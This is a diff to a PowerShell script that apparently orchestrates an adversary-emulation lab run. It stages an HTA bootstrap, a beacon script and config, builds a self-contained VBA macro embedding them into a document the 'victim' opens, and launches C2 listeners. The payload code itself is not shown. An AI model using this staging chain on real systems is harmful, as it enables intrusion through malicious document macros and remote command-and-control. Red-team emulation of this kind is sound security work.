@@ -97,10 +97,18 @@ function Start-Phase {
     Copy-Item (Join-Path $repo 'payloads/hta/bootstrap.hta') (Join-Path $repo $Staging) -Force
     Copy-Item (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') (Join-Path $repo $Staging) -Force
     Copy-Item (Join-Path $repo 'payloads/config/c0015-phase7.example.ini') (Join-Path $repo "$Staging/config-phase7.ini") -Force
+    # rerun-v2: build the self-contained macro (embeds config+hta+beacon) so WS01
+    # holds NO staged tooling before the victim opens test.docm.
+    & (Join-Path $repo 'payloads/packaging/gen_macro_embedded.ps1') `
+        -Config (Join-Path $repo "$Staging/config.ini") `
+        -Hta  (Join-Path $repo 'payloads/hta/bootstrap.hta') `
+        -Beacon (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') `
+        -OutPath (Join-Path $repo "$Staging/macro_embedded.vba") | Out-Null
     Step "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
     & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir 'build/out' | Out-Null
     Wait-Listeners
-    Step '== WS01 (MANUAL): stage_ws01.ps1 + install_macro_docm.ps1 + mo test.docm (Enable Content) =='
+    Step '== WS01 (rerun-v2, remote via vmrun): install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba =='
+    Step '== WS01: mo test.docm (victim action; macros enabled qua Trust Center preflight) =='
     Step 'Sau khi mo xong, chay -Action P1 / P2.'
 }
 
